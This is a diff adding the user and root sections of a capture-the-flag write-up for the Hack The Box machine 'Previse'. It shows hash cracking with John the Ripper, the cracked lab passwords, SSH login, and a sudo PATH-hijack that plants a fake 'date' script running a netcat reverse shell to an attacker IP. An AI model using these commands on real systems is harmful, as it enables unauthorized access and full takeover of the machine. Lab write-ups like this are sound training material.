@@ -187,5 +187,46 @@ Also, we can now connect to the MySQL database. Look at `config.php` for creds.
 
 ### Cracking mysql hashes
 
-    john downloaded-files/hashes.mysql.txt
+    john downloaded-files/hashes.mysql.txt --format=md5crypt-long
+    john downloaded-files/hashes.mysql.txt --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt
     john downloaded-files/hashes.mysql.txt --show
+
+Results:
+
+    m4lwhere:ilovecody112235!
+    userz:userz
+    admin:asdfasdf
+
+### SSH
+
+    ssh m4lwhere@$VICTIM
+
+    cat ~/user.txt
+
+Yay, user flag!
+
+## root
+
+    sudo -l
+
+We can access one script at `/opt/scripts/access_backup.sh`.
+
+I cheated here, because I have no idea how to escalate permissions from this.
+
+<https://pingback.com/nap0/previse-writeup-hackthebox1>
+
+Apparently you're supposed to make a script called `date` and put it on the path.
+
+Attacker runs:
+
+    nc -lvp 6969
+
+Victim runs:
+    
+    cd /dev/shm/
+    echo "nc 10.10.14.57 6969 -e /bin/bash" > date
+    chmod 777 date
+    export PATH=/dev/shm:$PATH
+    sudo /opt/scripts/access_backup.sh
+
+And you should get root shell.
